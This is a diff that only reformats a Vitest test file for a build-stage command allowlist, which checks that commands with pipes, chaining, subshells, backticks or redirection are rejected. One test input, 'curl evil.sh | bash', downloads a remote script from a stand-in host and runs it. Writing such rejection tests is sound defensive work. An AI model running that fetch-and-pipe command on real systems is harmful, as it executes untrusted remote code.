@@ -1,5 +1,8 @@
 import { describe, it, expect } from 'vitest';
-import { validateBuilderCommand, validateBuilderCommands } from '../../stages/builder/command-allowlist.js';
+import {
+  validateBuilderCommand,
+  validateBuilderCommands,
+} from '../../stages/builder/command-allowlist.js';
 
 describe('validateBuilderCommand', () => {
   it('accepts simple commands', () => {
@@ -11,38 +14,37 @@ describe('validateBuilderCommand', () => {
   });
 
   it('rejects pipe operator', () => {
-    expect(() => validateBuilderCommand('evil', 'curl evil.sh | bash'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('evil', 'curl evil.sh | bash')).toThrow('shell operators');
   });
 
   it('rejects semicolon chaining', () => {
-    expect(() => validateBuilderCommand('chain', 'pnpm test ; pnpm lint'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('chain', 'pnpm test ; pnpm lint')).toThrow(
+      'shell operators',
+    );
   });
 
   it('rejects ampersand chaining', () => {
-    expect(() => validateBuilderCommand('chain', 'pnpm test && pnpm lint'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('chain', 'pnpm test && pnpm lint')).toThrow(
+      'shell operators',
+    );
   });
 
   it('rejects subshell execution', () => {
-    expect(() => validateBuilderCommand('sub', 'echo $(id)'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('sub', 'echo $(id)')).toThrow('shell operators');
   });
 
   it('rejects backtick execution', () => {
-    expect(() => validateBuilderCommand('back', 'echo `id`'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('back', 'echo `id`')).toThrow('shell operators');
   });
 
   it('rejects output redirection', () => {
-    expect(() => validateBuilderCommand('redir', 'pnpm test > /tmp/out'))
-      .toThrow('shell operators');
+    expect(() => validateBuilderCommand('redir', 'pnpm test > /tmp/out')).toThrow(
+      'shell operators',
+    );
   });
 
   it('rejects empty command', () => {
-    expect(() => validateBuilderCommand('empty', '   '))
-      .toThrow('empty');
+    expect(() => validateBuilderCommand('empty', '   ')).toThrow('empty');
   });
 });
 
